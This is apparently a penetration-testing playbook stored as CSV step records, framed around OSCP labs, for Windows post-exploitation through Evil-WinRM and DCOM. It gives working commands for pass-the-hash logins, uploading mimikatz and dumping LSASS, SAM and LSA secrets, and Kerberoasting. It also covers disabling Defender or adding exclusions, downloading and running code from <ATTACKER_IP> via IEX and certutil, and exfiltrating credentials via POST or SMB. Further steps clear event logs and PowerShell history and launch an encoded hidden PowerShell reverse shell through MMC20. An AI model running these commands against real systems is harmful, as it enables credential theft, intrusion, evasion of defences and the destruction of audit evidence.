"access-postgres","Access PostgreSQL Database","Connect to PostgreSQL with discovered credentials","Use psql client to connect with found credentials.
Enumerate databases and tables.
Check for superuser privileges which enable file read and command execution.","",""
"escalate-web-admin","Escalate to Web Admin","Use database access to extract or reset admin password hash","Query users table for admin credentials.
Hash may be crackable (MD5, bcrypt) or directly modifiable if write access.

Common tables: users, admin, accounts, members.
Common columns: username, password, email, hash, role.","",""
"verify-winrm-accessible","Verify WinRM Service Accessible","Confirm target system has WinRM enabled and accessible before attempting connection","Check if target system has WinRM service enabled and ports accessible. This prevents wasted time attempting connections to systems without WinRM.

Port Scan (Quick Check):
```bash
nmap -p 5985,5986 <TARGET_IP>
```

Ports:
- 5985: HTTP WinRM (default, unencrypted)
- 5986: HTTPS WinRM (encrypted, requires SSL)

Expected Output (WinRM Enabled):
```
PORT     STATE SERVICE
5985/tcp open  wsman
5986/tcp open  wsmans
```

Expected Output (WinRM Disabled):
```
PORT     STATE  SERVICE
5985/tcp closed wsman
5986/tcp closed wsmans
```

Detailed Service Detection:
```bash
nmap -p 5985,5986 -sV <TARGET_IP>
```

Expected:
```
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Alternative: Test with crackmapexec:
```bash
crackmapexec winrm <TARGET_IP> -u <user> -p <password>
```

Expected (WinRM Enabled):
```
WINRM  <TARGET_IP>  5985  <HOSTNAME>  [+] DOMAIN\user:password (Pwn3d!)
```

WinRM Status Interpretation:
- Port 5985 open: WinRM enabled, use evil-winrm normally
- Port 5986 open: HTTPS WinRM, use evil-winrm with -S flag
- Both closed: WinRM disabled, use alternative (PSExec, WMI, RDP)
- Filtered: Firewall blocking, may still work from internal network

Checking from Windows (if you have access to another domain system):
```powershell
Test-NetConnection -ComputerName <TARGET> -Port 5985
```

OR
```powershell
Test-WSMan -ComputerName <TARGET>
```

Expected (WinRM Enabled):
```
wsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd
ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd
ProductVendor   : Microsoft Corporation
ProductVersion  : OS: 0.0.0 SP: 0.0 Stack: 3.0
```

Troubleshooting:

1. Ports Closed:
   - WinRM may not be enabled on target
   - Check if target is Windows Server (more likely to have WinRM)
   - Try alternative lateral movement (PSExec, WMI)

2. Ports Filtered:
   - Firewall blocking external access
   - Try from pivot point inside network
   - Check if you're on correct network segment

3. Connection Timeout:
   - Target may be offline (ping first)
   - Network routing issues
   - Check VPN/tunnel status

WinRM Enabling (if you have admin access via another method):
```powershell
# From target system (via PSExec or RDP):
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
Restart-Service WinRM
```

Firewall Rule (if needed):
```powershell
New-NetFirewallRule -Name ""WinRM-HTTP"" -DisplayName ""WinRM HTTP"" -Enabled True -Direction Inbound -Protocol TCP -LocalPort 5985
```

Verification Summary:
- ✓ Port 5985 or 5986 open
- ✓ Service responds to nmap scan
- ✓ crackmapexec confirms WinRM accessibility
- ✓ Target system online and accessible

If WinRM NOT available:
- Use PSExec: impacket-psexec <domain>/<user>:<password>@<target>
- Use WMI: impacket-wmiexec <domain>/<user>:<password>@<target>
- Use RDP: xfreerdp /u:<user> /p:<password> /v:<target>
- Use SMB exec: impacket-smbexec <domain>/<user>:<password>@<target>","",""
"establish-connection","Establish Evil-WinRM Connection","Connect to target system using Evil-WinRM with password or Pass-the-Hash","Establish interactive PowerShell session on target system using Evil-WinRM. Supports both password and Pass-the-Hash authentication.

Connection Method 1: Password Authentication
```bash
evil-winrm -i <TARGET_IP> -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>'
```

Example:
```bash
evil-winrm -i 10.10.10.75 -u 'CORP\mike' -p 'Password123!'
```

Connection Method 2: Pass-the-Hash
```bash
evil-winrm -i <TARGET_IP> -u '<DOMAIN>\<USERNAME>' -H <NTLM_HASH>
```

Example:
```bash
evil-winrm -i 10.10.10.75 -u 'CORP\administrator' -H a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
```

Connection Method 3: HTTPS/SSL WinRM (Port 5986)
```bash
evil-winrm -i <TARGET_IP> -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' -S
```

Connection Method 4: Local Account (Non-Domain)
```bash
evil-winrm -i <TARGET_IP> -u '<USERNAME>' -p '<PASSWORD>'
```

Note: No domain prefix for local accounts.

CRITICAL SYNTAX RULES:

1. Domain Format:
   - CORRECT: 'DOMAIN\user' (single quotes, backslash)
   - WRONG: DOMAIN/user (forward slash doesn't work)
   - WRONG: -d DOMAIN -u user (no -d flag in evil-winrm)
   - WRONG: user@DOMAIN (UPN format not supported)

2. Quoting:
   - Single quotes REQUIRED for 'DOMAIN\user' (escapes backslash in bash)
   - Password with special chars: Single quotes recommended
   - Example: -p 'P@ssw0rd!'

3. Hash Format:
   - NTLM hash: 32 hexadecimal characters
   - No colons or prefixes (just the hash)
   - Example: -H a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6

Expected Output (Success):
```
Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mike\Documents>
```

Key Indicators:
- ""Establishing connection to remote endpoint"" message
- PowerShell prompt appears: *Evil-WinRM* PS C:\...
- No error messages

Expected Output (Failed Authentication):
```
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

Causes:
- Wrong password/hash
- Wrong domain name
- User doesn't exist
- Account locked/disabled

Expected Output (Connection Refused):
```
Error: An error of type Errno::ECONNREFUSED happened, message is Connection refused - connect(2)
```

Causes:
- WinRM not enabled (check step 1)
- Wrong IP address
- Target offline
- Firewall blocking

Connection Options:

-i <IP>        : Target IP or hostname
-u <USER>      : Username (with domain prefix for domain accounts)
-p <PASSWORD>  : Password
-H <HASH>      : NTLM hash (Pass-the-Hash)
-S             : Enable SSL (for port 5986)
-P <PORT>      : Custom port (default: 5985)
-s <SCRIPT>    : Execute PowerShell script on connect

Verification After Connection:
```powershell
whoami
```
Expected: DOMAIN\username

```powershell
hostname
```
Expected: Target system name

```powershell
whoami /groups
```
Check for: BUILTIN\Administrators (confirms local admin)

Troubleshooting:

1. ""WinRMAuthorizationError"":
   - Test credentials first: crackmapexec smb <target> -u <user> -p <password>
   - Verify domain name: May be NetBIOS vs FQDN issue
   - Check account status: net user <username> /domain

2. ""Connection refused"":
   - Verify WinRM enabled (step 1)
   - Check IP address (ping target)
   - Try alternative port (-P 5986 with -S)

3. ""SSL Certificate Verification Failed"":
   - Use -S flag but don't validate cert
   - Self-signed cert is normal in labs

4. ""Timeout"":
   - Network routing issue
   - Firewall blocking
   - Target offline

5. Syntax errors:
   - Verify quotes: 'DOMAIN\user' (single quotes)
   - No -d flag (common mistake from other tools)
   - Backslash not forward slash

Alternative Connection Methods (if Evil-WinRM fails):
- PSExec: impacket-psexec CORP/user:password@<target>
- WMI: impacket-wmiexec CORP/user:password@<target>
- SMBExec: impacket-smbexec CORP/user:password@<target>","",""
"verify-environment","Verify Environment and Privileges","Verify you're on the correct system with expected privileges before proceeding with operations","Verify connection details, system information, and privilege level before proceeding with file operations or credential harvesting.

Verification Commands:

1. Confirm User Identity:
```powershell
whoami
```
Expected: DOMAIN\username (or HOSTNAME\username for local)
Verifies: You're logged in as intended user

2. Confirm System Hostname:
```powershell
hostname
```
Expected: Target system name (CLIENT75, DC01, etc.)
Verifies: You're on correct system (not wrong IP)

3. Check User Groups:
```powershell
whoami /groups
```
Look for:
- BUILTIN\Administrators (confirms local admin)
- DOMAIN\Domain Admins (confirms DA privileges)
- BUILTIN\Remote Management Users (confirms WinRM access)

Expected Output (Local Admin):
```
GROUP INFORMATION
-----------------

Group Name                             Type
====================================== ====
BUILTIN\Administrators                 Alias
BUILTIN\Users                          Alias
NT AUTHORITY\INTERACTIVE               Well-known group
...
```

4. Check User Privileges:
```powershell
whoami /priv
```
Look for:
- SeDebugPrivilege (needed for mimikatz)
- SeImpersonatePrivilege (needed for privilege escalation)
- SeBackupPrivilege (needed for file access)

Expected Output (Admin User):
```
PRIVILEGE INFORMATION
---------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeDebugPrivilege              Debug programs                       Disabled
SeBackupPrivilege             Back up files and directories        Disabled
SeRestorePrivilege            Restore files and directories        Disabled
...
```

Note: ""Disabled"" is normal - privileges can be enabled when needed.

5. System Information:
```powershell
systeminfo
```
Key fields:
- OS Name: Windows Server 2019, Windows 10, etc.
- OS Version: Build number
- Domain: Confirms domain membership
- Logon Server: Shows which DC authenticated you

6. Network Configuration:
```powershell
ipconfig /all
```
Verifies:
- IP address matches target
- DNS servers (shows DCs)
- Domain name

7. Current Directory:
```powershell
pwd
```
Expected: C:\Users\<username>\Documents (default location)

Comprehensive Verification:
```powershell
Write-Host ""[*] User Identity: "" -NoNewline; whoami
Write-Host ""[*] Hostname: "" -NoNewline; hostname
Write-Host ""[*] Domain: "" -NoNewline; (Get-WmiObject Win32_ComputerSystem).Domain
Write-Host ""[*] Local Admin: "" -NoNewline; ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Host ""[*] Current Directory: "" -NoNewline; pwd
```

Expected Output:
```
[*] User Identity: CORP\mike
[*] Hostname: CLIENT75
[*] Domain: CORP.LOCAL
[*] Local Admin: True
[*] Current Directory: C:\Users\mike\Documents
```

Environment Checks:

1. Writable Directories:
```powershell
Test-Path C:\temp -PathType Container
```
If False: mkdir C:\temp

Alternative writable locations:
- C:\Users\Public
- C:\ProgramData
- $env:TEMP (user temp directory)

2. PowerShell Version:
```powershell
$PSVersionTable
```
Expected: PSVersion 5.1 or higher
Relevant for: PowerShell script compatibility

3. Antivirus Status:
```powershell
Get-MpComputerStatus
```
Key fields:
- RealTimeProtectionEnabled: True/False
- AntivirusEnabled: True/False

If True: May need AV evasion for mimikatz

4. Windows Defender Exclusions:
```powershell
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```
Shows: Directories excluded from AV scanning

Documentation Template:
```
=== ENVIRONMENT VERIFICATION ===
User: CORP\mike
Hostname: CLIENT75
Domain: CORP.LOCAL
Local Admin: Yes
Privileges: SeDebugPrivilege, SeImpersonatePrivilege
OS: Windows Server 2019 (Build 17763)
AV Status: Windows Defender Enabled
Current Directory: C:\Users\mike\Documents
Writable: C:\temp (created)
```

Troubleshooting:

1. Not Local Admin:
   - whoami /groups doesn't show BUILTIN\Administrators
   - Solution: Verify credentials, may need different user

2. Wrong System:
   - hostname doesn't match expected target
   - Solution: Disconnect, verify IP address, reconnect

3. Limited Privileges:
   - Missing SeDebugPrivilege
   - Solution: May work for file operations, but mimikatz may fail

4. AV Alerts:
   - Defender triggering on commands
   - Solution: Note for later, may need obfuscation","",""
"upload-tools","Upload Tools and Scripts","Transfer necessary tools (mimikatz, scripts, etc.) to target system for post-exploitation","Use Evil-WinRM's built-in upload functionality to transfer tools to target system. This is MORE CONVENIENT than setting up SMB server.

Preparation:
1. Navigate to writable directory on target:
```powershell
cd C:\temp
```

If directory doesn't exist:
```powershell
mkdir C:\temp
cd C:\temp
```

Evil-WinRM Upload Syntax:
```
upload <local_path> <remote_path>
```

Example: Upload mimikatz
```
upload /opt/mimikatz/x64/mimikatz.exe C:\temp\mimikatz.exe
```

Expected Output (Success):
```
Info: Uploading /opt/mimikatz/x64/mimikatz.exe to C:\temp\mimikatz.exe

Data: 1398016 bytes of 1398016 bytes copied

Info: Upload successful!
```

Key Indicators:
- ""Upload successful!"" message
- Correct byte count
- No error messages

Verify Upload:
```powershell
dir C:\temp\mimikatz.exe
```

Expected:
```
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/25/2025  10:30 AM        1398016 mimikatz.exe
```

Verify File Integrity:
```powershell
Get-FileHash C:\temp\mimikatz.exe -Algorithm MD5
```

Compare with known good hash of mimikatz.

Multiple File Upload:
```
# From Evil-WinRM prompt:
upload /opt/mimikatz.exe C:\temp\mimikatz.exe
upload /opt/PowerUp.ps1 C:\temp\PowerUp.ps1
upload /opt/Invoke-Kerberoast.ps1 C:\temp\Invoke-Kerberoast.ps1
```

Upload to Different Locations:
```
upload /opt/tool.exe C:\Users\Public\tool.exe
upload /opt/script.ps1 C:\ProgramData\script.ps1
```

Common Tools to Upload:

1. Credential Harvesting:
   - mimikatz.exe (credential dumping)
   - Invoke-Mimikatz.ps1 (in-memory mimikatz)
   - pypykatz (Python alternative)

2. Enumeration:
   - PowerUp.ps1 (privilege escalation checks)
   - Sherlock.ps1 (missing patches)
   - BloodHound.ps1 (AD enumeration)

3. Persistence:
   - nc.exe (netcat for reverse shells)
   - meterpreter payload

4. Exploitation:
   - exploits.exe (privilege escalation exploits)
   - Invoke-Kerberoast.ps1 (Kerberoasting)

Alternative Upload Methods (if evil-winrm upload fails):

1. PowerShell Download:
```powershell
IWR -Uri http://<ATTACKER_IP>/mimikatz.exe -OutFile C:\temp\mimikatz.exe
```

Requires: HTTP server on attacker (python3 -m http.server 80)

2. SMB Copy:
```powershell
copy \\<ATTACKER_IP>\share\mimikatz.exe C:\temp\mimikatz.exe
```

Requires: SMB server on attacker (impacket-smbserver share /opt -smb2support)

3. Certutil:
```powershell
certutil -urlcache -split -f http://<ATTACKER_IP>/mimikatz.exe C:\temp\mimikatz.exe
```

4. Base64 Encoding (for small files):
Attacker:
```bash
base64 -w 0 script.ps1 > script.b64
```

Target:
```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""<BASE64_STRING>"")) | Out-File C:\temp\script.ps1
```

Antivirus Evasion:

1. Rename Files:
```
upload /opt/mimikatz.exe C:\temp\update.exe
```

2. Add to Exclusions (if admin):
```powershell
Add-MpPreference -ExclusionPath C:\temp
```

3. Disable AV Temporarily:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Note: Requires admin, may trigger alerts.

4. Use Obfuscated Versions:
- Upload obfuscated mimikatz
- Use Invoke-Mimikatz (PowerShell, in-memory)
- Use pypykatz (Python, less detected)

Troubleshooting:

1. Upload Fails:
   - Check permissions: mkdir C:\temp as admin
   - Try alternative location: C:\Users\Public
   - Use alternative method: PowerShell IWR

2. File Deleted Immediately:
   - Antivirus quarantined file
   - Check: Get-MpThreatDetection
   - Solution: Add exclusion, use obfuscated version

3. Partial Upload:
   - Network interruption
   - Solution: Re-upload, verify file size

4. Wrong File Size:
   - Corrupted transfer
   - Solution: Re-upload, verify hash

5. Permission Denied:
   - Not local admin
   - Solution: Verify privileges, try different directory","",""
"execute-operations","Execute Tools and Collect Results","Execute uploaded tools, capture output, and collect results for exfiltration","Execute tools on target system and redirect output to files for later download. Focus on credential harvesting and enumeration.

Credential Harvesting Workflow:

1. Execute Mimikatz:
```powershell
.\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"" > credentials.txt
```

Execution time: 2-10 seconds
Output file: credentials.txt (~50-200 lines)

2. Verify Execution:
```powershell
dir credentials.txt
```

Expected: File exists with size > 0 bytes

3. Preview Output:
```powershell
Get-Content credentials.txt -Head 50
```

Look for: ""Privilege '20' OK"" (confirms success)

Alternative Commands:

Mimikatz Kerberos Tickets:
```powershell
.\mimikatz.exe ""privilege::debug"" ""sekurlsa::tickets /export"" ""exit""
```

Creates: .kirbi files in current directory

Mimikatz LSA Secrets:
```powershell
.\mimikatz.exe ""privilege::debug"" ""lsadump::secrets"" ""exit"" > secrets.txt
```

Mimikatz SAM Dump:
```powershell
.\mimikatz.exe ""privilege::debug"" ""lsadump::sam"" ""exit"" > sam.txt
```

PowerShell-Based Credential Harvesting:

1. Invoke-Mimikatz (In-Memory):
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '""privilege::debug"" ""sekurlsa::logonpasswords""' > creds.txt
```

2. PowerUp (Privilege Escalation Checks):
```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks > privesc.txt
```

3. Kerberoasting:
```powershell
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat > kerberoast.txt
```

Enumeration Commands:

1. Domain Users:
```powershell
net user /domain > domain_users.txt
```

2. Domain Admins:
```powershell
net group ""Domain Admins"" /domain > domain_admins.txt
```

3. Domain Computers:
```powershell
net group ""Domain Computers"" /domain > domain_computers.txt
```

4. Local Users:
```powershell
net user > local_users.txt
```

5. Running Processes:
```powershell
Get-Process > processes.txt
```

6. Installed Software:
```powershell
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* > software.txt
```

7. Scheduled Tasks:
```powershell
schtasks /query /fo LIST /v > scheduled_tasks.txt
```

8. Network Connections:
```powershell
netstat -ano > network.txt
```

9. Shares:
```powershell
net share > shares.txt
```

10. Firewall Rules:
```powershell
netsh advfirewall show allprofiles > firewall.txt
```

Flag Retrieval:

1. User Flag:
```powershell
type C:\Users\<username>\Desktop\user.txt
```

2. Root/Admin Flag (if DA):
```powershell
type C:\Users\Administrator\Desktop\proof.txt
```

OR
```powershell
type C:\Users\Administrator\Desktop\root.txt
```

3. Search for Flags:
```powershell
Get-ChildItem -Path C:\ -Include *.txt,*.xml -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match ""flag|proof|user|root""}
```

Long-Running Commands:

For commands that take time (>10 seconds):
```powershell
Start-Job -ScriptBlock {command} > output.txt
```

Check status:
```powershell
Get-Job
```

Get results:
```powershell
Receive-Job -Id 1
```

Output Management:

1. Redirect to Files:
```powershell
command > output.txt      # Overwrite
command >> output.txt     # Append
command 2>&1 > output.txt # Include errors
```

2. Copy to Clipboard (for small output):
```powershell
whoami /all | clip
```

3. Format Output:
```powershell
Get-Process | Format-Table -AutoSize > processes.txt
```

Troubleshooting:

1. Command Hangs:
   - Press Ctrl+C to abort
   - Use timeout: timeout /t 30 command
   - Run in background: Start-Job

2. Output Too Large:
   - Limit results: Select-Object -First 100
   - Filter: Where-Object {condition}
   - Compress: Compress-Archive -Path C:\temp\*.txt -DestinationPath C:\temp\results.zip

3. Execution Policy Blocked:
```powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
```

4. Mimikatz Fails:
   - Check privilege::debug output: ""Privilege '20' OK""
   - Try alternative: Invoke-Mimikatz
   - Check AV: Get-MpComputerStatus

5. File Not Created:
   - Check permissions: Test-Path C:\temp\output.txt
   - Verify command completed: Check for errors
   - Try different location: %TEMP%","",""
"download-results","Download Results and Evidence","Exfiltrate all collected data, credentials, and flags for offline analysis and writeup documentation","Use Evil-WinRM's built-in download functionality to exfiltrate collected data back to attacker system.

Evil-WinRM Download Syntax:
```
download <remote_path> <local_path>
```

Example: Download credentials
```
download C:\temp\credentials.txt /tmp/creds.txt
```

Expected Output (Success):
```
Info: Downloading C:\temp\credentials.txt to /tmp/creds.txt

Data: 51200 bytes of 51200 bytes copied

Info: Download successful!
```

Batch Download:
```
# Download all collected files:
download C:\temp\credentials.txt /tmp/credentials.txt
download C:\temp\sam.txt /tmp/sam.txt
download C:\temp\domain_admins.txt /tmp/domain_admins.txt
download C:\temp\privesc.txt /tmp/privesc.txt
download C:\temp\network.txt /tmp/network.txt
```

Download Kerberos Tickets:
```powershell
# First, list ticket files:
dir C:\temp\*.kirbi
```

Then download each:
```
download C:\temp\ticket1.kirbi /tmp/ticket1.kirbi
download C:\temp\ticket2.kirbi /tmp/ticket2.kirbi
```

Compress Before Download (for large results):
```powershell
# On target:
Compress-Archive -Path C:\temp\*.txt -DestinationPath C:\temp\results.zip
```

Then download:
```
download C:\temp\results.zip /tmp/results.zip
```

On attacker:
```bash
unzip /tmp/results.zip -d /tmp/results/
```

Priority Download Order:

1. Credentials (Highest Priority):
   - credentials.txt (mimikatz output)
   - sam.txt (SAM dump)
   - secrets.txt (LSA secrets)
   - *.kirbi (Kerberos tickets)

2. Flags:
   - user.txt
   - proof.txt / root.txt

3. Enumeration:
   - domain_admins.txt
   - domain_users.txt
   - privesc.txt (PowerUp output)
   - processes.txt
   - network.txt

4. Evidence:
   - systeminfo.txt
   - whoami_all.txt
   - screenshots (if taken)

Verify Downloads:

On attacker system:
```bash
# Check file exists:
ls -lh /tmp/credentials.txt

# Verify not empty:
wc -l /tmp/credentials.txt

# Preview contents:
head -20 /tmp/credentials.txt
```

Alternative Download Methods:

1. PowerShell Web Upload:
```powershell
# On target:
Invoke-WebRequest -Uri http://<ATTACKER_IP>/upload -Method POST -InFile C:\temp\credentials.txt
```

Requires: Web server on attacker that accepts POST uploads

2. SMB Copy:
```powershell
# On target:
copy C:\temp\credentials.txt \\<ATTACKER_IP>\share\
```

Requires: SMB server on attacker

3. Base64 Exfiltration (small files):
```powershell
# On target:
[Convert]::ToBase64String([IO.File]::ReadAllBytes(""C:\temp\credentials.txt""))
```

Copy output, decode on attacker:
```bash
echo ""<BASE64_STRING>"" | base64 -d > credentials.txt
```

4. DNS Exfiltration (stealth):
For sensitive environments with egress filtering.

Documentation Package:

Create organized directory structure:
```bash
mkdir -p /tmp/CLIENT75_evidence/{credentials,enumeration,flags,screenshots}

# Download to organized locations:
download C:\temp\credentials.txt /tmp/CLIENT75_evidence/credentials/
download C:\temp\domain_admins.txt /tmp/CLIENT75_evidence/enumeration/
download C:\temp\user.txt /tmp/CLIENT75_evidence/flags/
```

Create evidence manifest:
```bash
cat > /tmp/CLIENT75_evidence/MANIFEST.txt << EOF
=== EVIDENCE MANIFEST ===
Target: CLIENT75.CORP.LOCAL (10.10.10.75)
User: CORP\mike
Date: $(date)

Files Collected:
- credentials.txt: Mimikatz credential dump (51KB)
- sam.txt: SAM database dump (12KB)
- domain_admins.txt: Domain Admin list (1KB)
- user.txt: User flag
- systeminfo.txt: System information (5KB)

Key Findings:
- Domain Admin credentials extracted: CORP\administrator
- User flag: <flag_contents>
- Service sessions: administrator, svc_backup
EOF
```

Cleanup Tracking:

Before downloading, document what to clean:
```powershell
# On target, create cleanup list:
dir C:\temp | Out-File C:\temp\cleanup_list.txt
```

Download cleanup list:
```
download C:\temp\cleanup_list.txt /tmp/cleanup_list.txt
```

Troubleshooting:

1. Download Fails:
   - Check file exists: dir C:\temp\credentials.txt
   - Check permissions: Try different location
   - Use alternative method: SMB, PowerShell upload

2. File Too Large:
   - Compress first: Compress-Archive
   - Download in chunks (not supported by evil-winrm)
   - Use alternative: SMB copy

3. Incomplete Download:
   - Network interruption
   - Re-download and verify size
   - Check file integrity on both sides

4. Permission Denied:
   - File locked by process
   - Close applications: Stop-Process
   - Copy to temp location first","",""
"session-cleanup","Session Cleanup and Exit","Optionally clean up artifacts and properly close Evil-WinRM session","Clean up uploaded tools and output files (optional for stealth), then properly exit Evil-WinRM session.

Cleanup Options:

Option 1: Full Cleanup (Stealth)
```powershell
# Remove uploaded tools:
Remove-Item C:\temp\mimikatz.exe
Remove-Item C:\temp\*.ps1

# Remove output files:
Remove-Item C:\temp\credentials.txt
Remove-Item C:\temp\*.txt
Remove-Item C:\temp\*.kirbi

# Remove directory (if created):
Remove-Item C:\temp -Recurse -Force
```

Option 2: Partial Cleanup (Keep evidence):
```powershell
# Remove only tools:
Remove-Item C:\temp\mimikatz.exe
Remove-Item C:\temp\*.ps1

# Keep output files for further analysis
```

Option 3: No Cleanup (Labs/CTF):
```
# Leave everything for writeup documentation
# Common in OSCP labs where stealth not required
```

Verify Cleanup:
```powershell
# Check directory empty:
dir C:\temp

# Check no artifacts in common locations:
dir C:\Users\Public
dir $env:TEMP
```

Expected (Full Cleanup):
```
Directory: C:\temp

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----

(empty)
```

Clear PowerShell History:
```powershell
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

Clear Windows Event Logs (Optional, noisy):
```powershell
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

Note: This is VERY noisy and will trigger alerts. Only do if explicitly required.

Proper Session Exit:

1. Exit Evil-WinRM:
```
exit
```

Expected:
```
Info: Exiting with code 0
```

2. Verify Disconnected:
   - Evil-WinRM prompt disappears
   - Returns to attacker shell
   - No error messages

Alternative Exit:
```
Ctrl+D
```

OR
```
Ctrl+C (then confirm)
```

Post-Session Verification:

On attacker system:
```bash
# Verify all files downloaded:
ls -lh /tmp/CLIENT75_evidence/

# Verify files not empty:
find /tmp/CLIENT75_evidence/ -type f -size 0

# Preview key files:
head /tmp/CLIENT75_evidence/credentials/credentials.txt
cat /tmp/CLIENT75_evidence/flags/user.txt
```

Session Documentation:

Create session log:
```bash
cat > /tmp/CLIENT75_evidence/SESSION_LOG.md << EOF
# Evil-WinRM Session Log

## Connection Details
- Target: CLIENT75.CORP.LOCAL (10.10.10.75)
- User: CORP\mike
- Method: Password authentication
- Start Time: $(date)
- Duration: 15 minutes

## Actions Performed
1. Verified environment (whoami, hostname, privileges)
2. Created C:\temp directory
3. Uploaded mimikatz.exe (1.2 MB)
4. Executed privilege::debug + sekurlsa::logonpasswords
5. Downloaded credentials.txt (51 KB)
6. Retrieved user flag
7. Cleaned up artifacts
8. Exited session

## Key Findings
- Local admin confirmed: Yes
- Credentials extracted: 5 user accounts
- Domain Admin found: CORP\administrator
- User flag: <flag_contents>

## Files Downloaded
- credentials.txt (mimikatz output)
- user.txt (flag)
- domain_admins.txt (DA list)
- systeminfo.txt (system info)

## Cleanup Status
- Tools removed: Yes
- Output files removed: Yes
- History cleared: Yes
EOF
```

Cleanup Considerations:

OSCP Labs:
- Cleanup usually NOT required (lab environment)
- Focus on documentation and learning
- Leaving artifacts helps with debugging

Real Engagements:
- Cleanup depends on scope and requirements
- Stealth operations: Full cleanup required
- Red team: May leave for blue team detection training
- Penetration test: Discuss with client

Legal/Ethical:
- ONLY perform cleanup if authorized
- Document all actions (even cleanup)
- Don't clear logs without explicit permission
- Maintain chain of custody for evidence

Troubleshooting:

1. Can't Remove Files:
   - File locked by process: Stop-Process
   - Permission denied: May need SYSTEM shell
   - File in use: Close applications first

2. History Not Clearing:
   - PowerShell history location varies
   - Check: (Get-PSReadlineOption).HistorySavePath
   - Manual deletion: Remove-Item <path>

3. Session Won't Exit:
   - Try Ctrl+C or Ctrl+D
   - Force close terminal
   - Verify no background jobs: Get-Job

4. Artifacts Remaining:
   - Check all upload locations
   - Check temp directories: $env:TEMP
   - Search for tools: Get-ChildItem -Recurse -Include mimikatz.exe

Final Verification:

Before closing session, verify:
- ✓ All evidence downloaded
- ✓ Files verified (not corrupted)
- ✓ Flags captured (if applicable)
- ✓ Credentials extracted and tested
- ✓ Documentation complete
- ✓ Cleanup performed (if required)
- ✓ Session properly closed

Exit session:
```
exit
```

End of Evil-WinRM operational workflow.","",""
"verify-winrm-port","Verify WinRM Port Open","Check if WinRM ports (5985 HTTP or 5986 HTTPS) are accessible","Quick nmap scan to verify WinRM service availability.

Port 5985 is HTTP (default), 5986 is HTTPS.
Most Windows Server environments have 5985 open by default.","",""
"test-winrm-auth","Test WinRM Authentication","Verify credentials work with WinRM before attempting full shell","Use CrackMapExec winrm module to test authentication.

This is faster than attempting full Evil-WinRM connection and provides clear success/failure indication.","",""
"connect-evil-winrm","Connect with Evil-WinRM","Establish interactive PowerShell remoting session using Evil-WinRM","Launch Evil-WinRM with credentials (password or hash).

Connection provides full interactive PowerShell with tab completion, command history, and file transfer capabilities.","",""
"verify-access","Verify Shell Access and Context","Confirm shell functionality and identify user context","Run basic commands to verify:
- whoami (user context)
- hostname (correct target)
- Get-ComputerInfo (system details)
- net user <username> /domain (group memberships)","",""
"upload-tools","Upload Enumeration Tools","Transfer enumeration tools (PowerUp, Sherlock, winPEAS) to target using Evil-WinRM","Use Evil-WinRM's built-in upload command to transfer PowerShell enumeration scripts.

Syntax: upload /path/to/local/file C:\path\to\remote\file","",""
"enumerate-target","Enumerate for Privilege Escalation","Run enumeration scripts to identify privilege escalation paths","Execute PowerUp.ps1 (Invoke-AllChecks), Sherlock.ps1, or winPEAS to identify misconfigurations.

Targets include:
- Unquoted service paths
- Weak permissions
- Credentials in registry
- Service misconfigurations","",""
"download-loot","Download Sensitive Files","Exfiltrate credentials, configuration files, and sensitive data using Evil-WinRM","Use Evil-WinRM's download command to retrieve files.

Syntax: download C:\path\to\remote\file /local/path

Common targets:
- SAM/SYSTEM hives
- NTDS.dit
- web.config
- Database configs","",""
"verify-rpc-port","Verify RPC Port 135 Accessible","Confirm RPC endpoint mapper port 135 is open for DCOM communication","Use Test-NetConnection from PowerShell to verify port 135 accessibility.
DCOM requires RPC port 135 + ephemeral high ports (49152-65535).","",""
"test-dcom-calc","Test DCOM with Calculator PoC","Verify DCOM exploitation works with harmless calculator test before deploying payload","Execute calculator on target using MMC20.Application.ExecuteShellCommand.
This confirms DCOM works without risking payload detection.","",""
"generate-payload","Generate Base64 PowerShell Payload","Create encoded reverse shell payload for DCOM execution","Use Python script to generate base64-encoded PowerShell reverse shell with attacker LHOST/LPORT.
Encoding necessary for ExecuteShellCommand argument passing.","",""
"setup-listener","Start Netcat Listener on Kali","Prepare listener to catch incoming reverse shell connection","Start nc -lvnp on specified port (commonly 443 or 4444) before executing DCOM payload.
Listener must be running before triggering the reverse shell.","",""
"execute-dcom-payload","Execute DCOM Reverse Shell","Deploy PowerShell reverse shell via DCOM MMC20.Application","Instantiate remote MMC20.Application object, call ExecuteShellCommand with base64 payload.

Syntax: $dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'powershell -nop -w hidden -e <BASE64>','7')","",""
"verify-shell-access","Verify Remote Shell Access","Confirm reverse shell connection and identify target system","Run whoami and hostname in caught shell to verify access and confirm correct target.
Shell runs as authenticated user in Session 0.","",""
